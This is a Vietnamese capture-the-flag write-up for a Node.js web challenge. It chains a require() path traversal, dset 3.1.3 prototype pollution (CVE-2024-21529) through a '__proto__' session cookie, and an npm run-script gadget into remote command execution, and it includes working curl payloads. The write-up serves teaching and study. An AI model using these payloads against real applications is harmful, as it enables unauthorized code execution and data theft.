---
title: HEPIHEPI
date: 2026-10-05
ctf: aochinh26
category: web
difficulty: medium
tags:
  - Node.js
  - Prototype Pollution
  - dset
  - CVE-2024-21529
  - Path Traversal
  - RCE
---

# Đề bài
Challenge cho sẵn source code một web fansite chạy Node.js + Express. Mục tiêu là đọc được `/flag.txt`, mà file này chỉ `root` đọc được — ta phải gọi binary setuid `readflag` để lấy nội dung, tức là cần đạt được RCE.

# Solution
Truy cập vào challenge, ta thấy một trang fansite của nhóm nhạc HepiHepi:

![image](./01-home.png)

Bấm vào một thành viên, ta sang trang chi tiết với URL dạng `/member?memberID=member1`:

![image](./02-member.png)

Trang này hiển thị thông tin lấy từ file `members/member1.js`. Ta mở source `index.js` lên soi, có ba đoạn đáng chú ý.

Đầu tiên là route `/member`:

```javascript!
app.get('/member', requireSession, (req, res) => {
    memberID = req.query.memberID
    memberStats = require(`./members/${memberID}.js`)
    res.render('member', { member: memberStats })
})
```

input của user (`memberID`) đã được chèn thẳng vào `require()` ở đoạn này. `require()` nhận một đường dẫn, mà ta lại điều khiển được phần giữa, nên có thể dùng path traversal `../` để thoát khỏi thư mục `members` và bắt Node load một file `.js` bất kỳ trên hệ thống. Giữ ý tưởng này lại, ta sẽ cần tới nó ở cuối bài.

Tiếp theo là middleware kiểm tra session và route đổi theme:

```javascript!
const sessionStorage = {}

function requireSession(req, res, next) {
    const sessionID = req.cookies.session
    if (!sessionID || !sessionStorage[sessionID]) {
        return res.redirect('/')
    }
    req.session = sessionStorage[sessionID]
    req.sessionID = sessionID
    next()
}

app.post('/change-theme', requireSession, (req, res) => {
    const { themeVar, themeVal } = req.body
    if (typeof themeVar !== 'string' || typeof themeVal !== 'string') {
        return res.status(400).send('themeVar and themeVal must be strings')
    }
    lib.dset(sessionStorage, [[req.sessionID], themeVar], themeVal)
    res.send('Change theme successfuly')
})
```

Chỗ `lib.dset(...)` là điểm mấu chốt. Trong `package.json`, thư viện `dset` được ghim cứng ở version `3.1.3` — đúng bản dính [CVE-2024-21529](https://github.com/lukeed/dset/security/advisories/GHSA-424m-424m-f5gf), một lỗi prototype pollution.

Vậy prototype pollution là gì? Trong JavaScript, mọi object thông thường đều kế thừa từ `Object.prototype`. Khi ta đọc một property mà bản thân object không có, parser sẽ đi ngược lên prototype chain để tìm. Nếu kẻ tấn công ghi được vào `Object.prototype`, thì property đó tự dưng xuất hiện trên *mọi* object trong chương trình. Có thể đọc thêm ở [PortSwigger](https://portswigger.net/web-security/prototype-pollution). Việc còn lại là tìm cho ra một property mà về sau được dùng vào chỗ nguy hiểm — gọi là gadget.

## Pollute Object.prototype qua dset

Ta mở source của `dset@3.1.3` ra xem nó chặn thế nào:

```javascript!
function dset(obj, keys, val) {
	keys.split && (keys=keys.split('.'));
	var i=0, l=keys.length, t=obj, x, k;
	while (i < l) {
		k = keys[i++];
		if (k === '__proto__' || k === 'constructor' || k === 'prototype') break;
		t = t[k] = (i === l) ? val : (typeof(x=t[k])===typeof(keys)) ? x : (keys[i]*0 !== 0 || !!~(''+keys[i]).indexOf('.')) ? {} : [];
	}
}
```

Thư viện có check `k === '__proto__'` để chặn. Nhưng đây là so sánh string nghiêm ngặt: nó chỉ chặn khi key *chính xác* là chuỗi `"__proto__"`. Giờ nhìn lại cách source gọi:

```javascript!
lib.dset(sessionStorage, [[req.sessionID], themeVar], themeVal)
```

Key path bị bọc kì lạ: phần tử đầu không phải string mà là một array `[req.sessionID]`. Đây chính là chỗ ta tận dụng. Nếu `req.sessionID` bằng `"__proto__"`, key đầu tiên sẽ là `["__proto__"]`:

1. Vòng lặp lấy `k = ["__proto__"]`. Dòng check `k === '__proto__'` so một *array* với một *string* nên trả về `false` → qua được hàng rào.
2. Nhưng ngay dòng sau, `t[k]` lại ép array về string để làm key: `(''+["__proto__"])` ra đúng `"__proto__"`. Thế là `t` nhảy thẳng vào `Object.prototype`.
3. Sang vòng lặp cuối với `k = themeVar`, vì `i === l` nên nó gán `Object.prototype[themeVar] = themeVal`.

Cái array `["__proto__"]` vừa trick được parser qua lớp check string, vừa coerce ngược về `"__proto__"` khi dùng làm key — đó là bản chất của CVE-2024-21529.

Còn một chi tiết: làm sao ép `req.sessionID = "__proto__"`? Nhìn lại `requireSession`, nó lấy session từ cookie rồi check `sessionStorage[sessionID]` có tồn tại không. Mà `sessionStorage` là một object rỗng `{}`, nên `sessionStorage["__proto__"]` trả về chính `Object.prototype` — một giá trị truthy. Vậy chỉ cần gửi cookie `session=__proto__` là qua được middleware mà chẳng cần đăng nhập, và `req.sessionID` lúc này đúng bằng `"__proto__"`.

Ghép lại, ta gửi request đầu tiên để pollute:

```bash!
curl -b "session=__proto__" -X POST http://localhost:5005/change-theme \
  --data-urlencode "themeVar=cmd" \
  --data-urlencode "themeVal=/readflag > /tmp/pwn.js 2>&1; sleep 90"
```

Lúc này `Object.prototype.cmd` đã mang giá trị command của ta. Vì sao chọn đúng key tên `cmd` thì phần sau sẽ rõ.

## Từ prototype pollution tới RCE

Pollute được rồi, nhưng muốn chạy `readflag` thì cần một gadget thực sự gọi command. Đây là lúc dùng lại lỗ hổng path traversal ở route `/member`: ta có thể bắt Node `require()` bất kỳ file `.js` nào.

Một đích ngon là chính CLI của npm. Node được cài global nên tồn tại file `/usr/lib/node_modules/npm/bin/npx-cli.js`. Khi file này được load, nó tự chuyển hướng sang chạy `npm exec`:

```javascript!
// npx-cli.js
const cli = require('../lib/cli.js')
process.argv[1] = require.resolve('./npm-cli.js')
process.argv.splice(2, 0, 'exec')
```

Lần theo `npm exec`, ta tới `libnpmexec`. Khi gọi mà không kèm package nào, nó rơi vào nhánh chạy script mặc định rồi đẩy xuống `@npmcli/run-script`. Mở `run-script-pkg.js` ra, đây là gadget:

```javascript!
let cmd = null
if (options.cmd) {
    cmd = options.cmd
} else if (pkg.scripts && pkg.scripts[event]) {
    cmd = pkg.scripts[event]
}
...
const [spawnShell, spawnArgs, spawnOpts] = makeSpawnArgs({ ..., cmd, ..., scriptShell })
const p = promiseSpawn(spawnShell, spawnArgs, spawnOpts, ...)
```

`options` là object cấu hình nội bộ, bản thân nó không hề có property `cmd`. Nhưng vì ta đã pollute `Object.prototype.cmd`, câu `if (options.cmd)` đi ngược lên prototype chain và nhặt đúng command của ta. Sau đó `makeSpawnArgs` dựng lời gọi với `shell: scriptShell` (mặc định là `sh`), nên cuối cùng server chạy `sh -c "<cmd>"`. Đây chính là lý do ở bước trước ta chọn pollute đúng key `cmd`.

Ta kích hoạt chuỗi bằng cách bắt `/member` require file npx-cli:

```bash!
curl -b "session=__proto__" \
  "http://localhost:5005/member?memberID=../../usr/lib/node_modules/npm/bin/npx-cli"
```

:::info
Từ `/app/members/`, hai lần `../` đưa về `/`, nên đường dẫn `require()` resolve ra đúng `/usr/lib/node_modules/npm/bin/npx-cli.js`.
:::

:::warning
`npm exec` chạy bất đồng bộ nên request này trả response gần như tức thì, command mới chạy ở phía sau sau đó vài giây (npm phải khởi động Arborist, đọc config...). Đọc flag ngay lập tức sẽ hụt vì file chưa kịp sinh ra. Đoạn `sleep 90` trong payload có hai tác dụng: giữ cho tiến trình `sh` chưa kết thúc, và quan trọng hơn là níu server sống thêm — vì sau khi `npm exec` xong nó sẽ gọi `process.exit`, kéo sập luôn server Node.
:::

## Đọc flag

`readflag` đã ghi output vào `/tmp/pwn.js`. Giờ ta lại tận dụng chính route `/member`: bắt nó `require('/tmp/pwn.js')`. Nội dung file là flag dạng `W1{...}` — không phải JavaScript hợp lệ, nên Node ném `SyntaxError`, và thông báo lỗi lại in ra đúng dòng đầu của file, tức là flag:

```bash!
curl -b "session=__proto__" "http://localhost:5005/member?memberID=../../tmp/pwn"
```

![image](./03-flag.png)

-> Flag: `W1{fake_flag}`

:::info
Bản deploy local trong Docker ship sẵn `flag.txt` là placeholder `W1{fake_flag}`, nên exploit chạy ra đúng chuỗi đó. Trên server thật của giải, cũng chuỗi lệnh này sẽ lộ ra flag thật theo format `W1{...}`.
:::
